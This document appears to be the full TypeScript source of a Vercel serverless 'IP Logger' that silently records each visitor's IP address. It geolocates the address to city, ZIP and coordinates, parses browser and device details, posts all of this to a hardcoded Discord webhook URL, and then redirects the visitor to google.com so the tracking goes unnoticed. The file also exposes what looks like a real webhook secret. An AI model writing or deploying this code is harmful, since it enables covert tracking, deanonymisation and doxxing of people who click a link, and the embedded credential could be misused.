import type { VercelRequest, VercelResponse } from '@vercel/node';
import UAParser from 'ua-parser-js';

interface IPInfo {
  ip: string;
  isp: string;
  as: string;
  country: string;
  countryCode: string;
  region: string;
  regionName: string;
  city: string;
  zip: string;
  lat: number;
  lon: number;
  timezone: string;
  mobile: boolean;
  proxy: boolean;
  hosting: boolean;
  query: string;
}

interface Config {
  redirectUrl: string;
  discordWebhook: string;
  richMessage: boolean;
  embedColor: number;
}

const config: Config = {
  redirectUrl: 'https://google.com',
  discordWebhook: 'https://discord.com/api/webhooks/1435223726328119476/L_CpCMoUuLRdnxvuT48kZpMuTAGw1Tq49jwN6gRSzAX5eGOLAQ82vnSCzrRkMPULCtQ2',
  richMessage: true,
  embedColor: 0x5865F2
};

async function getIPInfo(ip: string): Promise<IPInfo | null> {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
    if (!response.ok) return null;
    return await response.json();
  } catch (error) {
    console.error('Error fetching IP info:', error);
    return null;
  }
}

function createDiscordEmbed(ipInfo: IPInfo, userAgent: string, referer: string, timestamp: string) {
  const parser = new UAParser(userAgent);
  const browser = parser.getBrowser();
  const os = parser.getOS();
  const device = parser.getDevice();

  const timezoneParts = ipInfo.timezone.split('/');
  const timezoneFormatted = timezoneParts.length > 1 
    ? `${timezoneParts[1].replace(/_/g, ' ')} (${timezoneParts[0]})`
    : ipInfo.timezone;

  const isBot = ipInfo.hosting && !ipInfo.proxy ? 'Possibly' : String(ipInfo.hosting);

  return {
    embeds: [{
      title: '🌍 New Visitor Detected',
      color: config.embedColor,
      timestamp: new Date().toISOString(),
      fields: [
        {
          name: '📍 Location',
          value: `**IP:** \`${ipInfo.ip}\`\n**Country:** ${ipInfo.country} :flag_${ipInfo.countryCode.toLowerCase()}:\n**Region:** ${ipInfo.regionName}\n**City:** ${ipInfo.city}\n**ZIP:** ${ipInfo.zip || 'N/A'}\n**Coordinates:** \`${ipInfo.lat}, ${ipInfo.lon}\`\n**Timezone:** ${timezoneFormatted}`,
          inline: false
        },
        {
          name: '🌐 Network',
          value: `**ISP:** ${ipInfo.isp}\n**ASN:** ${ipInfo.as}\n**Mobile:** ${ipInfo.mobile ? '📱 Yes' : '🖥️ No'}\n**VPN/Proxy:** ${ipInfo.proxy ? '🔒 Yes' : '❌ No'}\n**Bot/Hosting:** ${isBot}`,
          inline: false
        },
        {
          name: '💻 Device Info',
          value: `**Browser:** ${browser.name || 'Unknown'} ${browser.version || ''}\n**OS:** ${os.name || 'Unknown'} ${os.version || ''}\n**Device:** ${device.type || 'Desktop'} ${device.vendor || ''} ${device.model || ''}`.trim(),
          inline: false
        },
        {
          name: '🔗 Additional',
          value: `**Referer:** ${referer || 'Direct'}\n**User Agent:** \`${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\``,
          inline: false
        },
        {
          name: '🕐 Timestamp',
          value: `\`${timestamp}\``,
          inline: false
        }
      ],
      footer: {
        text: 'IP Logger by Vercel',
        icon_url: 'https://assets.vercel.com/image/upload/front/favicon/vercel/180x180.png'
      }
    }]
  };
}

async function sendToDiscord(payload: any): Promise<boolean> {
  try {
    const response = await fetch(config.discordWebhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    return response.ok;
  } catch (error) {
    console.error('Error sending to Discord:', error);
    return false;
  }
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  try {
    const ip = (req.headers['x-forwarded-for'] as string)?.split(',')[0].trim() 
      || (req.headers['x-real-ip'] as string)
      || req.socket.remoteAddress 
      || 'Unknown';

    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || req.headers['referrer'] || '';
    const timestamp = new Date().toLocaleString('th-TH', { 
      timeZone: 'Asia/Bangkok',
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    });

    const ipInfo = await getIPInfo(ip);

    if (config.richMessage && ipInfo) {
      const embed = createDiscordEmbed(ipInfo, userAgent, referer, timestamp);
      sendToDiscord(embed).catch(err => console.error('Discord send failed:', err));
    } else if (ipInfo) {
      const simpleMessage = {
        content: `**New Visitor**\n🌍 IP: \`${ip}\`\n📍 Location: ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}\n💻 Browser: ${new UAParser(userAgent).getBrowser().name}\n🕐 Time: ${timestamp}`
      };
      sendToDiscord(simpleMessage).catch(err => console.error('Discord send failed:', err));
    }

    res.status(302).setHeader('Location', config.redirectUrl).end();
    
  } catch (error) {
    console.error('Handler error:', error);
    res.status(302).setHeader('Location', config.redirectUrl).end();
  }
}